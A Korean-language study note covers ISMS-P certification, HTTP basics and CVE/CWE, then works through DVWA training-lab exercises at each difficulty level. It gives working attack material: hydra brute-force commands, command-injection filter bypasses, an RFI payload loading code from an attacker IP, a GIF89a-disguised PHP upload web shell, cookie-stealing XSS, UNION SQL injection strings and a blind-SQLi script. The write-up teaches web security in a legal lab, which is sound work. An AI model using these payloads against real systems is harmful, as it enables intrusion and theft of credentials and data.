ISMS-P, 웹해킹(DVWA)

정보보호 인증 기준(ISMS-P)과 웹해킹 기초 개념을 정리하고, DVWA로 Low/Medium/High 난이도별 우회 기법을 비교 실습

1. ISMS-P 개념

ISMS-P(정보보호 및 개인정보보호 관리체계)는 KISA가 운영하는 국내 통합 인증제도로, 2018년 기존 ISMS(정보보호)와 PIMS(개인정보보호)를 통합. 정보의 기밀성·무결성·가용성 유지, 개인정보 안전 관리, 법적 요구사항 준수를 위해 사용.

웹해킹 기본 개념

코드의미
1XX처리 중
2XX성공
3XX리다이렉트
4XX클라이언트 오류
5XX서버 오류

HTTP 요청은 메소드(무엇을)·헤더(어떻게)·바디(무슨 데이터를) 세 요소로 구성. CVE는 실제 발견된 특정 취약점의 고유 번호(예: CVE-2021-44228=Log4j), CWE는 취약점의 근본 원인 유형 분류(예: CWE-89=SQL Injection).

2. DVWA 실습

DVWA(Damn Vulnerable Web Application)는 SQL Injection, XSS 등 다양한 취약점이 내장된 합법적 실습용 웹 애플리케이션.

Brute Force

입력값 검증이 없는 로그인 폼 → hydra로 무차별 대입. Burp Suite로는 워드리스트 공격 시 응답 길이가 다른 요청을 찾아 성공 여부 판별.

hydra -l admin -P password.txt [IP] http-get-form \
"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=xxx;security=low:F=incorrect."

Command Injection

Low: shell_exec로 입력값을 그대로 명령어에 삽입하는 구조 → ;(항상 실행) 또는 &&(앞이 성공해야 실행)로 명령어 추가.
Medium: &&, ;만 필터링 → 필터링 안 된 |, ||로 우회.
High: 대부분의 특수문자를 블랙리스트에 올렸지만 | (파이프+공백)만 걸러서, 공백 없이 |id처럼 붙여쓰면 우회 가능.

File Inclusion (LFI/RFI)

Low: page 파라미터를 검증 없이 include()에 사용 → /etc/passwd 직접 접근(LFI), 공격자가 띄운 외부 파일을 불러와 실행(RFI).
Medium: http://, https://를 공백 치환해 RFI만 차단 → 대소문자 섞은 Http://나 hthttptp://로 우회.
High: file* 패턴만 허용하지만 file:// 프로토콜은 걸러지지 않아 LFI 여전히 가능.

?page=http://[공격자IP]:8000/test.php   // RFI, test.php엔 system('whoami') 등

File Upload

Low: 검증 없음, 업로드 경로가 그대로 노출되어 바로 php 실행.
Medium: 클라이언트가 보내는 Content-Type만 검사 → Burp Suite로 Content-Type을 image/jpeg로 조작해 우회.
High: 확장자 + getimagesize()로 매직 바이트까지 검사 → GIF89a(텍스트로 쉽게 추가 가능한 매직 바이트)를 PHP 코드 앞에 붙여 업로드 통과, File Inclusion과 결합해 ?page=...cmd.php.jpg&cmd=id 형태로 실행.

XSS (Reflected / Stored)

Reflected — Low: 필터 없음. Medium: <script>를 소문자로만 필터링 → 대소문자 혼용으로 우회. High: 정규식으로 <script> 패턴 전체를 감지 → 다른 태그(<img src=x onerror=alert(document.cookie)>)로 우회.
Stored — Name 입력란은 maxlength 제한을 개발자 도구로 늘려 우회, Medium은 message 필드는 강하게 필터링(strip_tags, htmlspecialchars 등)하지만 name 필드는 소문자만 걸러 우회 가능.

SQL Injection

Low: 1' OR '1'='1로 인증 우회 → UNION SELECT로 컬럼 수 확인 → database()로 DB명 → information_schema로 테이블/컬럼명 → 데이터 추출 → 해시(MD5) 길이로 알고리즘 식별 후 rockyou.txt로 사전 공격까지 전 과정 실습.

1' UNION SELECT 1,2#              // 컬럼 수 확인
1' UNION SELECT database(),2#     // DB명
1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema='dvwa'#
1' UNION SELECT user,password FROM users#

Medium: 따옴표는 mysql_real_escape_string으로 막히지만 id 값이 따옴표 없이 삽입되는 구조라 1 OR 1=1처럼 따옴표 없는 공격은 그대로 통과. 문자열은 16진수(0x7573657273)로 인코딩해 따옴표 없이 전달.
High: LIMIT 1이 걸려있어 1' or 1=1;#처럼 주석으로 무력화해야 전체 행 조회 가능.

SQL Injection (Blind)

데이터가 직접 보이지 않고 참/거짓 응답 차이만으로 한 글자씩 추론. 파이썬으로 1~20 범위의 id를 자동 요청해 "MISSING" 문구 유무로 마지막 존재 행을 판별하는 스크립트 작성. Medium은 드롭다운이라 직접 입력이 안 되므로 Burp Suite로 요청을 가로채거나 requests.post로 우회.

import requests
URL = "http://[IP]/vulnerabilities/sqli_blind/"
COOKIES = {"id":"1","PHPSESSID":"xxx","security":"low"}
for i in range(1, 21):
    res = requests.get(URL, params={"id": i, "Submit": "Submit"}, cookies=COOKIES)
    if "User ID is MISSING from the database." in res.text:
        print(f"end = {i-1}")
        break
